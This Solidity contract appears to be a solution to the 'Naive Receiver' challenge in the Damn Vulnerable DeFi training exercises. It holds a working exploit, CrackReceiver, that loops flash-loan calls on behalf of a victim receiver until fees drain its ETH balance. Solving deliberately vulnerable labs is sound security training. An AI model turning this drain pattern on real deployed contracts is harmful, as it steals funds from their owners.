// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract CrackReceiver is IERC3156FlashBorrower {

    address payable private pool;
    IERC3156FlashBorrower private receiver;

    error UnsupportedCurrency();

    constructor(address payable _pool, IERC3156FlashBorrower _receiver) payable {
        pool = _pool;
        receiver = _receiver;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        
        NaiveReceiverLenderPool lenderPool = NaiveReceiverLenderPool(pool);
        while (address(receiver).balance > 0) {
          lenderPool.flashLoan(receiver, token, amount, data);
        }

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, 1 ether);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function drainFunds() external {
      NaiveReceiverLenderPool lenderPool = NaiveReceiverLenderPool(pool);
      address ETH = lenderPool.ETH();
      while (address(receiver).balance > 0) {
        lenderPool.flashLoan(receiver, ETH, 0, "0x");
      }
    }
    
    // Allow deposits of ETH
    receive() external payable {}
}

